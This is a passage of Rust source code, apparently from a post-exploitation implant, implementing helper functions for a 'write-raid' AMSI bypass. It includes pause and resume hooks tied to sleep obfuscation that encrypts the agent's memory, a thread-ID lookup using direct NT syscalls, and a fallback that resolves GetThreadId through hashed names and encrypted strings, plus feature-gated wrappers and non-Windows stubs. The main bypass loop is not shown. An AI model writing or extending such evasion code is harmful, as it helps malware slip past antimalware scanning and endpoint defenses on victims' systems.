
    /// Return the thread ID of the write-raid thread (0 if not active).
    pub fn thread_id() -> u64 {
        RAID_THREAD_ID.load(Ordering::Acquire)
    }

    /// Pause the write-raid thread.
    ///
    /// Called by sleep obfuscation before encrypting agent memory.  The
    /// write-raid thread will spin-yield (no AMSI writes) until
    /// `resume()` is called.  This prevents the race thread from touching
    /// memory while it is in an encrypted state.
    pub fn pause() {
        if ACTIVE.load(Ordering::Acquire) {
            PAUSE_REQUESTED.store(true, Ordering::Release);
            log::debug!("write_raid: pause requested");
        }
    }

    /// Resume the write-raid thread after a pause.
    ///
    /// Called by sleep obfuscation after decrypting agent memory.
    pub fn resume() {
        PAUSE_REQUESTED.store(false, Ordering::Release);
        log::debug!("write_raid: resume requested");
    }

    /// Thread entry point trampoline.  `CreateThread` expects a
    /// `LPTHREAD_START_ROUTINE` which takes a `LPVOID` parameter.
    extern "system" fn write_raid_thread_entry(_param: *mut std::ffi::c_void) -> u32 {
        unsafe {
            write_raid_loop();
        }
        0
    }

    /// Query the TID of a thread handle via `NtQueryInformationThread`.
    unsafe fn get_thread_id(handle: u64) -> u64 {
        let mut tid: u64 = 0;
        // ThreadBasicInformation = 0
        struct CLIENT_ID {
            unique_process: u64,
            unique_thread: u64,
        }
        let mut client_id = CLIENT_ID {
            unique_process: 0,
            unique_thread: 0,
        };
        let status = nt_syscall::syscall!(
            "NtQueryInformationThread",
            handle,
            0u64, // ThreadBasicInformation
            &mut client_id as *mut CLIENT_ID as u64,
            std::mem::size_of::<CLIENT_ID>() as u64,
            0u64, // ReturnLength (optional)
        );
        if let Ok(s) = status {
            if s >= 0 {
                tid = client_id.unique_thread;
            }
        }
        if tid == 0 {
            // Fallback: use GetThreadId from kernel32.
            let k32_hash = pe_resolve::hash_str(
                &string_crypt::enc_str!("kernel32.dll\0"),
            );
            if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
                let gti_hash = pe_resolve::hash_str(
                    &string_crypt::enc_str!("GetThreadId\0"),
                );
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, gti_hash) {
                    let get_thread_id_fn: extern "system" fn(u64) -> u32 =
                        std::mem::transmute(addr);
                    tid = get_thread_id_fn(handle) as u64;
                }
            }
        }
        tid
    }
}

// ── Non-Windows / non-write-raid-amsi stubs ─────────────────────────────────

/// Enable the write-raid AMSI bypass.
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn enable_write_raid() -> anyhow::Result<()> {
    write_raid::enable()
}

/// Disable the write-raid AMSI bypass.
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn disable_write_raid() -> anyhow::Result<()> {
    write_raid::disable()
}

/// Return whether the write-raid bypass is currently active.
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn is_write_raid_active() -> bool {
    write_raid::is_active()
}

/// Get the write-raid thread ID (0 if not active).
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn write_raid_thread_id() -> u64 {
    write_raid::thread_id()
}

/// Pause the write-raid thread (called by sleep obfuscation before memory encryption).
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn pause_write_raid() {
    write_raid::pause();
}

/// Resume the write-raid thread (called by sleep obfuscation after memory decryption).
#[cfg(all(windows, feature = "write-raid-amsi"))]
pub fn resume_write_raid() {
    write_raid::resume();
}

// Stubs for non-Windows or when write-raid-amsi is not enabled.
#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn enable_write_raid() -> anyhow::Result<()> {
    Err(anyhow::anyhow!("write-raid AMSI bypass requires Windows + write-raid-amsi feature"))
}

#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn disable_write_raid() -> anyhow::Result<()> {
    Err(anyhow::anyhow!("write-raid AMSI bypass requires Windows + write-raid-amsi feature"))
}

#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn is_write_raid_active() -> bool {
    false
}

#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn write_raid_thread_id() -> u64 {
    0
}

#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn pause_write_raid() {}

#[cfg(not(all(windows, feature = "write-raid-amsi")))]
pub fn resume_write_raid() {}
